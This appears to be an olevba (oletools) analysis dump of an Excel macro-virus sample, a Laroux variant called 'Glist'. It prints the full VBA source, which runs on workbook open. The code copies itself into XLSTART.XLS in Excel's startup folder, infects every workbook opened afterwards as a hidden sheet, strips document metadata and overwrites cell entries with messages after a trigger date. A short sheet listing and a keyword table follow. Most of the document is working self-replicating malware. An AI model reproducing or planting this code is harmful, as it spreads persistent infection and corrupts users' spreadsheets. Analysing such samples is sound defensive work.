olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-42e94b084454b0c47ca6d3fea8fd5a7d13ac8487
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Glist.bas 
in file: Virus.MSExcel.Laroux-based-42e94b084454b0c47ca6d3fea8fd5a7d13ac8487 - OLE stream: '_VBA_PROJECT_CUR/VBA/Glist'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Glist Virus Version 1.0 - quick and dirty modification of Laroux
' Copyright (c) Laroux Software
' Portions copyright (c) Lord Asd
' Not too much damage, might be much worse, am I right?

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "DamnedOpen"
    Application.OnEntry = "Effect"
End Sub

Sub Effect()
Attribute Effect.VB_ProcData.VB_Invoke_Func = " \n14"
     Triggered = DateSerial(Year(Now()), Month(Now()), Day(Now())) - DateSerial(1997, 12, 20)
     Rem date/month/day format
     If (Triggered > 10) Then
      ActiveCell.Value = "In madness you dwell"
     Else
      If (Triggered > 0) Then
       ActiveCell.Value = "Out of the shadows we'll go, there's no reason to hide anymore..."
      Else
      End If
     End If
End Sub


Sub DamnedOpen()
Attribute DamnedOpen.VB_ProcData.VB_Invoke_Func = " \n14"
    m$ = Dir(Application.StartupPath & "\" & "XLSTART.XLS")
    If m$ = "XLSTART.XLS" Then Alr = 1 Else Alr = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = Alr + w * 666
    
Select Case whichfile
    Case 666
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("Glist").Visible = True
    Sheets("Glist").Select
    Sheets("Glist").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "XLSTART.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("Glist").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "XLSTART.xls!DamnedOpen"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "Glist" Then
        Workbooks("XLSTART.XLS").Sheets("Glist").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("Glist").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "XLSTART.xls!DamnedOpen"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  Glis
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

